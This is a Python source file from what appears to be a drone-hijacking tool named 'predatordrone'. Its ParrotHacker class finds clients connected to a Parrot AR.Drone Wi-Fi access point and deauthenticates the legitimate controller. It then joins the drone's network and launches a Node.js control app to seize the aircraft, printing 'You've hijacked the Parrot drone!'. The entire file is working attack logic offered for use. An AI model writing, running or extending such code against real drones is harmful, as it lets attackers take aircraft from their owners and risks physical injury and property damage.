#! /usr/bin/env python3
#
# Parrot APs listing functions
#

from predatordrone.wifi import WifiManager, AccessPoint, Client
from predatordrone.external_exec import do
from predatordrone.menu import Menu
import predatordrone.disp as disp
import re



# ===============
#    Constants
# ===============

nodejs        = "node"
controljs     = "app.js"
controljs_dir = "ardrone-webflight"




# ==================================
#    Parrot AR.Drone hacking tool
# ==================================

class ParrotHacker:

    def __init__(self, wlan, parrot_ap):
        """ Initialize the Parrot hacker class. """
        self.wlan = wlan
        self.ap   = parrot_ap
        self.clients = []

        self.menu = Menu(
                    ("Hacking menu for", self.ap.short_str()),
                    ("Your choice:"),
                    exit_opt_msg   ="Go back to main menu (exit hacking menu)",
                    no_num_opts_msg="No client detected. Try to search for new connected clients!",
                    exit_on_ctrlc  =False
                )
        self.menu.add_static_opt('S', "Search for new connected clients", self.search_new_clients)
        self.menu.add_static_opt('T', "Take control (no connected clients)", self.take_control)
        self.menu.add_static_opt('C', "Clear client list", self.clear_clients_list)


    def __str__(self):
        return self.ap.__str__()


    def hack(self):
        """ Hacks current AP. """
        self.menu.run()



    # =======================
    #    Client management
    # =======================

    def clear_clients_list(self):
        """ Clears client list. """

        self.menu.clear_numbered_opt()
        disp.info("Parrot hacking menu entries cleared")

        self.clients = []
        disp.info("Client list cleared")


    def search_new_clients(self):
        disp.info("Searching for connected clients to Parrot AP", self.ap.ssid)
        self.wlan.search_clients(self.ap, self.register_client)


    def register_client(self, client):
        """ Register a client to this Parrot AP. """
        if client not in self.clients:
            self.clients.append(client)
            self.menu.add_numbered_opt(
                    ("Disconnect client", client.ip, "then take control"),
                    lambda: self.disconnect_then_control(client)
                )
            disp.item1("Found client on", client)



    # =====================
    #    Hacking methods
    # =====================

    def take_control(self):
        """ Takes control of the drone. """
        # Connect AP
        disp.info("Connecting to drone", self.ap.short_str())
        self.wlan.connect_access_point(self.ap)

        disp.info("Acquiring IP from drone")
        self.wlan.acquire_ip()

        disp.info("Taking drone control")
        do("cd", controljs_dir, ';', nodejs, controljs)

        disp.info("Well done! You've hijacked the Parrot drone! :)")


    def disconnect_then_control(self, client):
        """ Disconnects a client then take control. """
        disp.info("Disconnecting client", client)
        self.wlan.deauth_client(client, self.ap)

        self.take_control()

